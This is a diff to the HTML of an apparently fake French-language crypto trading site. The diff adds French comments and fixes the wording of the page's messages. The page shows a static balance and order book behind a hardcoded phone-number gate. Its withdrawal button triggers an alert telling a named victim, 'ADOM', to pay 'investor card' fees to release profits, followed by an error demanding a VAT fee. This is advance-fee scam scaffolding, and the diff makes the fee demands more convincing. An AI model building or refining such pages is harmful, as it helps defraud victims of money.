@@ -6,6 +6,7 @@
     <title>Trading Investissement - Crypto Trading</title>
     <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
     <style>
+        /* Styles globaux pour l'apparence générale */
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
@@ -71,6 +72,7 @@
             margin-right: 10px;
         }
 
+        /* Style principal pour la section principale */
         main {
             display: flex;
             flex-direction: column;
@@ -85,6 +87,7 @@
             max-width: 1200px;
         }
 
+        /* Affichage des prix et variation */
         .price-info {
             display: flex;
             justify-content: space-between;
@@ -123,6 +126,7 @@
             width: 100%;
         }
 
+        /* Style pour le carnet d'ordres */
         .order-book {
             background-color: #1c1c1c;
             padding: 20px;
@@ -149,6 +153,7 @@
             text-align: center;
         }
 
+        /* Style des boutons et formulaires */
         .actions-container {
             display: flex;
             justify-content: space-between;
@@ -165,10 +170,6 @@
             font-weight: bold;
             width: 48%;
             border-radius: 10px;
-        }
-
-        .actions-container button:nth-child(1) {
-            margin-right: 20px; /* Add space between buttons */
         }
 
         .withdrawal-form {
@@ -209,6 +210,7 @@
             padding: 20px 0;
         }
 
+        /* Style réactif pour les appareils mobiles */
         @media (max-width: 768px) {
             header, nav, .price-info, .order-book, .actions-container, .withdrawal-form {
                 padding: 10px;
@@ -253,6 +255,7 @@
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 </head>
 <body>
+    <!-- Sécurité de l'accès via numéro de téléphone -->
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
         if (code === "90298629") {
@@ -263,6 +266,7 @@
         }
     </script>
 
+    <!-- En-tête du site -->
     <header>
         <div class="logo">
             <h1>Trading Investissement</h1>
@@ -279,6 +283,8 @@
             </div>
         </nav>
     </header>
+
+    <!-- Section principale : Interface de trading -->
     <main>
         <div class="trading-interface">
             <section class="price-info">
@@ -297,7 +303,7 @@
                         <span class="amount">0.19707 BTC</span>
                         <span class="total">13,395.70515 USDT</span>
                     </div>
-                    <!-- Repeat for more orders -->
+                    <!-- Ajoutez des ordres supplémentaires ici -->
                 </div>
             </section>
             <section class="actions-container">
@@ -312,10 +318,13 @@
             <section class="error-message" id="error-message"></section>
         </div>
     </main>
+
+    <!-- Pied de page -->
     <footer>
         <p>© 2024 Africa Investissement. Tous droits réservés.</p>
     </footer>
-    <script src="script.js"></script> <!-- External JS for better organization -->
+
+    <script src="script.js"></script> <!-- Fichier JS externe -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const priceElement = document.querySelector('.price-info .price');
@@ -356,10 +365,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher ADOM, veuillez payer les frais de carte d'\investisseur afin recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher ADOM, veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : frais de tva néccéssaire.';
+                errorMessage.textContent = 'Erreur : frais de TVA nécessaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
